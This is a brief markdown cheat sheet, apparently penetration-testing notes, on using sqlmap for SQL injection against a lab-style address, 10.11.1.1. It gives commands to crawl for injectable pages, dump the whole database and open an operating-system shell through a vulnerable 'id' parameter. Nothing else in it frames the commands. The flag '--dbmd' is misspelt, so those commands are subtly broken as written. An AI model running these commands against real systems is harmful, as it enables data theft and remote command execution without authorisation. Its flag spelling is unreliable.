# SQL Injections


## Check for SQL injections
```bash
sqlmap -u http://10.11.1.1 --crawl=1
```

## Atack vulnerable URL
```bash
# Dump database
sqlmap -u http://10.11.1.1/page.php?id=73 --dbmd=mysql --dump --threads=5

# Get shell
sqlmap -u http://10.11.1.1/page.php?id=73 --dbmd=mysql --os-shell
```
